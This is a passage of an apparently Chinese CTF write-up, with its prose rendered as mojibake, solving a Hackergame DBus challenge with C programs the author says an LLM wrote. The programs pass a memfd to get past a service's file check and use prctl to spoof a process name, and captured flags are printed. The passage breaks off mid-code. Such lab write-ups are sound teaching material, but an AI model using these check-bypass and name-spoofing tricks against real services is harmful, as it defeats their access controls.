</span></span></code></pre></div><h2 id=ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿>ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿<a hidden class=anchor aria-hidden=true href=#ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿>#</a></h2><p>å€¼å¾—ä¸€æçš„æ˜¯è¿™é“é¢˜æ˜¯å®Œå…¨ç”±LLMå†™çš„ï¼Œæ²¡æœ‰ä»»ä½•äººå·¥å¹²é¢„ï¼Œä¸”LLMå†™å‡ºæ¥çš„WPå´æ˜¯å®Œå…¨æ­£ç¡®çš„ã€‚</p><details><summary>LLMï¼ˆClaudeï¼‰å†™çš„ç­”æ¡ˆï¼Œæœªç»ä»»ä½•ä¿®æ”¹</summary><h3 id=what-dbus-gonna-do>What DBus Gonna Do?<a hidden class=anchor aria-hidden=true href=#what-dbus-gonna-do>#</a></h3><p>è®©æˆ‘åˆ†æä¸€ä¸‹è¿™é“CTFé¢˜ç›®ã€‚ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºDBusçš„ç³»ç»ŸæœåŠ¡ï¼Œæä¾›äº†ä¸‰ä¸ªè·å–flagçš„æ–¹æ³•ã€‚æˆ‘ä»¬å…ˆå…³æ³¨ç¬¬ä¸€ä¸ªflagã€‚</p><p>ä»flagserver.cçš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°è·å–flag1çš„æ–¹æ³•æ˜¯<code>GetFlag1</code>ï¼Œå®ƒéœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œä¸”è¯¥å‚æ•°å¿…é¡»ä¸¥æ ¼ç­‰äº"Please give me flag1"ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„Cç¨‹åºæ¥è°ƒç”¨è¿™ä¸ªDBusæ–¹æ³•ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;gio/gio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define DEST &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define OBJECT_PATH &#34;/cn/edu/ustc/lug/hack/FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define METHOD &#34;GetFlag1&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define INTERFACE &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>GError</span> <span class=o>*</span><span class=n>error</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GDBusConnection</span> <span class=o>*</span><span class=n>connection</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GVariant</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Connect to the system bus
</span></span></span><span class=line><span class=cl>    <span class=n>connection</span> <span class=o>=</span> <span class=nf>g_bus_get_sync</span><span class=p>(</span><span class=n>G_BUS_TYPE_SYSTEM</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>connection</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Failed to connect to the system bus: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Call the D-Bus method with the required string
</span></span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>g_dbus_connection_call_sync</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>connection</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>DEST</span><span class=p>,</span>        <span class=c1>// destination
</span></span></span><span class=line><span class=cl>        <span class=n>OBJECT_PATH</span><span class=p>,</span> <span class=c1>// object path
</span></span></span><span class=line><span class=cl>        <span class=n>INTERFACE</span><span class=p>,</span>   <span class=c1>// interface name
</span></span></span><span class=line><span class=cl>        <span class=n>METHOD</span><span class=p>,</span>      <span class=c1>// method
</span></span></span><span class=line><span class=cl>        <span class=nf>g_variant_new</span><span class=p>(</span><span class=s>&#34;(s)&#34;</span><span class=p>,</span> <span class=s>&#34;Please give me flag1&#34;</span><span class=p>),</span> <span class=c1>// parameters
</span></span></span><span class=line><span class=cl>        <span class=nf>G_VARIANT_TYPE</span><span class=p>(</span><span class=s>&#34;(s)&#34;</span><span class=p>),</span>  <span class=c1>// expected return type
</span></span></span><span class=line><span class=cl>        <span class=n>G_DBUS_CALL_FLAGS_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>-</span><span class=mi>1</span><span class=p>,</span>  <span class=c1>// timeout (use default)
</span></span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>error</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>const</span> <span class=n>gchar</span> <span class=o>*</span><span class=n>response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_get</span><span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=s>&#34;(&amp;s)&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_print</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_unref</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Error calling D-Bus method: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>g_object_unref</span><span class=p>(</span><span class=n>connection</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EXIT_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>é¦–å…ˆå°†è¿™ä¸ªç¨‹åºç¼–è¯‘:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc getflag1.c <span class=sb>`</span>pkg-config --cflags --libs gio-2.0<span class=sb>`</span> -o getflag1
</span></span></code></pre></div><ol start=2><li>ç„¶åå°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>base64 getflag1 --wrap<span class=o>=</span><span class=m>0</span>
</span></span></code></pre></div><ol start=3><li>å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨</li></ol><p>è¿™ä¸ªç¨‹åºä¼šï¼š</p><ol><li>è¿æ¥åˆ°DBusç³»ç»Ÿæ€»çº¿</li><li>è°ƒç”¨FlagServiceçš„GetFlag1æ–¹æ³•</li><li>ä¼ å…¥æŒ‡å®šçš„å­—ç¬¦ä¸²"Please give me flag1"</li><li>æ‰“å°è¿”å›çš„flagå†…å®¹</li></ol><p>ç¨‹åºæ¨¡ä»¿äº†getflag3.cçš„ç»“æ„ï¼Œä½†åšäº†å¿…è¦çš„ä¿®æ”¹ä»¥é€‚åº”GetFlag1æ–¹æ³•çš„è¦æ±‚ã€‚ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼š</p><ol><li>æ·»åŠ äº†æ­£ç¡®çš„å‚æ•° <code>"Please give me flag1"</code></li><li>æŒ‡å®šäº†æ­£ç¡®çš„è¿”å›ç±»å‹ <code>G_VARIANT_TYPE("(s)")</code></li><li>æ­£ç¡®å¤„ç†å¹¶æ‰“å°è¿”å›çš„å­—ç¬¦ä¸²</li></ol><p>è¿™åº”è¯¥èƒ½æˆåŠŸè·å–åˆ°ç¬¬ä¸€ä¸ªflagã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®ä½¿ç”¨äº†Dockerç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŒ‰ç…§æŒ‡å®šçš„æ–¹å¼æäº¤ç¨‹åºã€‚</p><p>è¦ç»§ç»­è·å–flag2å’Œflag3å—ï¼Ÿ</p><pre tabindex=0><code>flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_c7afe80dbf}
</code></pre><h3 id=if-i-could-be-a-file-descriptor>If I Could Be A File Descriptor<a hidden class=anchor aria-hidden=true href=#if-i-could-be-a-file-descriptor>#</a></h3><p>å¥½çš„ï¼Œè®©æˆ‘ä»¬æ¥åˆ†æè·å–flag2çš„æ–¹æ³•ã€‚</p><p>ä»flagserver.cçš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒGetFlag2æ–¹æ³•éœ€è¦ï¼š</p><ol><li>ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦(fd)ä½œä¸ºå‚æ•°</li><li>ä»è¿™ä¸ªfdè¯»å–çš„å†…å®¹å¿…é¡»ä¸¥æ ¼ç­‰äº"Please give me flag2\n"</li><li>è¿™ä¸ªfdä¸èƒ½æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼ˆé€šè¿‡æ£€æŸ¥/proc/self/fd/{fd}çš„ç¬¦å·é“¾æ¥å®ç°ï¼‰</li></ol><p>ç”±äºä¸èƒ½ä½¿ç”¨æ™®é€šæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pipeæˆ–memfdæ¥å®ç°ã€‚æˆ‘é€‰æ‹©ä½¿ç”¨memfdï¼Œå› ä¸ºå®ƒæ›´ç°ä»£ä¸”æ›´é€‚åˆè¿™ç§åœºæ™¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;gio/gio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define DEST &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define OBJECT_PATH &#34;/cn/edu/ustc/lug/hack/FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define METHOD &#34;GetFlag2&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define INTERFACE &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>GError</span> <span class=o>*</span><span class=n>error</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GDBusConnection</span> <span class=o>*</span><span class=n>connection</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GVariant</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create memfd
</span></span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>memfd</span> <span class=o>=</span> <span class=nf>memfd_create</span><span class=p>(</span><span class=s>&#34;flag2_request&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>memfd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;memfd_create failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Write the required message
</span></span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span> <span class=o>=</span> <span class=s>&#34;Please give me flag2</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>memfd</span><span class=p>,</span> <span class=n>msg</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>msg</span><span class=p>))</span> <span class=o>!=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>msg</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;write failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>memfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Reset file position to beginning
</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>memfd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;lseek failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>memfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Connect to the system bus
</span></span></span><span class=line><span class=cl>    <span class=n>connection</span> <span class=o>=</span> <span class=nf>g_bus_get_sync</span><span class=p>(</span><span class=n>G_BUS_TYPE_SYSTEM</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>connection</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Failed to connect to the system bus: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>memfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create GUnixFDList and add our fd
</span></span></span><span class=line><span class=cl>    <span class=n>GUnixFDList</span> <span class=o>*</span><span class=n>fd_list</span> <span class=o>=</span> <span class=nf>g_unix_fd_list_new</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>gint</span> <span class=n>fd_index</span> <span class=o>=</span> <span class=nf>g_unix_fd_list_append</span><span class=p>(</span><span class=n>fd_list</span><span class=p>,</span> <span class=n>memfd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd_index</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Failed to append fd: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_object_unref</span><span class=p>(</span><span class=n>connection</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>memfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Call the D-Bus method
</span></span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>g_dbus_connection_call_with_unix_fd_list_sync</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>connection</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>DEST</span><span class=p>,</span>        <span class=c1>// destination
</span></span></span><span class=line><span class=cl>        <span class=n>OBJECT_PATH</span><span class=p>,</span> <span class=c1>// object path
</span></span></span><span class=line><span class=cl>        <span class=n>INTERFACE</span><span class=p>,</span>   <span class=c1>// interface name
</span></span></span><span class=line><span class=cl>        <span class=n>METHOD</span><span class=p>,</span>      <span class=c1>// method
</span></span></span><span class=line><span class=cl>        <span class=nf>g_variant_new</span><span class=p>(</span><span class=s>&#34;(h)&#34;</span><span class=p>,</span> <span class=n>fd_index</span><span class=p>),</span> <span class=c1>// parameters
</span></span></span><span class=line><span class=cl>        <span class=nf>G_VARIANT_TYPE</span><span class=p>(</span><span class=s>&#34;(s)&#34;</span><span class=p>),</span>  <span class=c1>// expected return type
</span></span></span><span class=line><span class=cl>        <span class=n>G_DBUS_CALL_FLAGS_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>-</span><span class=mi>1</span><span class=p>,</span>  <span class=c1>// timeout (use default)
</span></span></span><span class=line><span class=cl>        <span class=n>fd_list</span><span class=p>,</span>  <span class=c1>// fd_list
</span></span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>    <span class=c1>// out_fd_list
</span></span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>error</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>const</span> <span class=n>gchar</span> <span class=o>*</span><span class=n>response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_get</span><span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=s>&#34;(&amp;s)&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_print</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_unref</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Error calling D-Bus method: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>g_object_unref</span><span class=p>(</span><span class=n>fd_list</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>g_object_unref</span><span class=p>(</span><span class=n>connection</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>memfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EXIT_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>ç¼–è¯‘ç¨‹åº:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc getflag2.c <span class=sb>`</span>pkg-config --cflags --libs gio-2.0<span class=sb>`</span> -o getflag2
</span></span></code></pre></div><ol start=2><li>å°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>base64 getflag2 --wrap<span class=o>=</span><span class=m>0</span>
</span></span></code></pre></div><ol start=3><li>å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨</li></ol><p>è¿™ä¸ªç¨‹åºçš„å…³é”®ç‚¹æ˜¯ï¼š</p><ol><li>ä½¿ç”¨memfd_createåˆ›å»ºä¸€ä¸ªå†…å­˜æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ ·åˆ›å»ºçš„fdä¸ä¼šæŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶</li><li>å‘memfdå†™å…¥æŒ‡å®šçš„å­—ç¬¦ä¸²"Please give me flag2\n"</li><li>å°†æ–‡ä»¶æŒ‡é’ˆé‡ç½®åˆ°å¼€å§‹ä½ç½®ï¼Œè¿™æ ·æœåŠ¡å™¨è¯»å–æ—¶èƒ½è¯»åˆ°å®Œæ•´å†…å®¹</li><li>ä½¿ç”¨g_unix_fd_list_newå’Œg_unix_fd_list_appendæ¥åˆ›å»ºå’Œæ·»åŠ æ–‡ä»¶æè¿°ç¬¦</li><li>ä½¿ç”¨g_dbus_connection_call_with_unix_fd_list_syncè€Œä¸æ˜¯æ™®é€šçš„call_syncï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¼ é€’æ–‡ä»¶æè¿°ç¬¦</li></ol><p>è¿™ä¸ªæ–¹æ¡ˆå¾ˆå·§å¦™åœ°ç»•è¿‡äº†æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ï¼Œå› ä¸ºmemfdåˆ›å»ºçš„æ˜¯å†…å­˜ä¸­çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸å­˜åœ¨äºå®é™…çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ŒåŒæ—¶åˆæ»¡è¶³äº†æœåŠ¡å™¨è¦æ±‚è¯»å–ç‰¹å®šå†…å®¹çš„æ¡ä»¶ã€‚</p><p>éœ€è¦è·å–flag3å—ï¼Ÿ</p><pre tabindex=0><code>flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_36a581e78b}
</code></pre><h3 id=comm-say-maybe>Comm Say Maybe<a hidden class=anchor aria-hidden=true href=#comm-say-maybe>#</a></h3><p>è®©æˆ‘åˆ†æä¸€ä¸‹è·å–flag3çš„è¦æ±‚ã€‚</p><p>ä»flagserver.cçš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°GetFlag3æ–¹æ³•æœ‰ä¸€ä¸ªç‰¹æ®Šçš„è¦æ±‚ï¼šè°ƒç”¨ç¨‹åºçš„è¿›ç¨‹åï¼ˆåœ¨/proc/{pid}/commä¸­ï¼‰å¿…é¡»ä¸¥æ ¼ç­‰äº"getflag3\n"ã€‚</p><p>å®é™…ä¸Šï¼Œé¢˜ç›®å·²ç»æä¾›äº†getflag3.cï¼Œå¹¶ä¸”åœ¨Makefileä¸­ä¼šç¼–è¯‘å¹¶å®‰è£…åˆ°/usr/bin/getflag3ã€‚è¿™çœ‹èµ·æ¥æ˜¯æ­£ç¡®çš„å®ç°ï¼Œä½†æ˜¯ä»é¢˜ç›®server.pyä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><ol><li>ç¨‹åºä¼šä»¥nobodyç”¨æˆ·èº«ä»½è¿è¡Œ</li><li>ç¨‹åºä¼šè¢«æ”¾åœ¨/dev/shm/executableè·¯å¾„ä¸‹</li><li>ç¨‹åºçš„åç§°ä¼šå˜æˆ"executable"è€Œä¸æ˜¯"getflag3"</li></ol><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¨‹åºæ¥ç¡®ä¿è¿›ç¨‹åæ˜¯"getflag3"ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨prctlç³»ç»Ÿè°ƒç”¨æ¥ä¿®æ”¹è¿›ç¨‹åï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;gio/gio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define DEST &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define OBJECT_PATH &#34;/cn/edu/ustc/lug/hack/FlagService&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define METHOD &#34;GetFlag3&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define INTERFACE &#34;cn.edu.ustc.lug.hack.FlagService&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Set the process name to &#34;getflag3&#34;
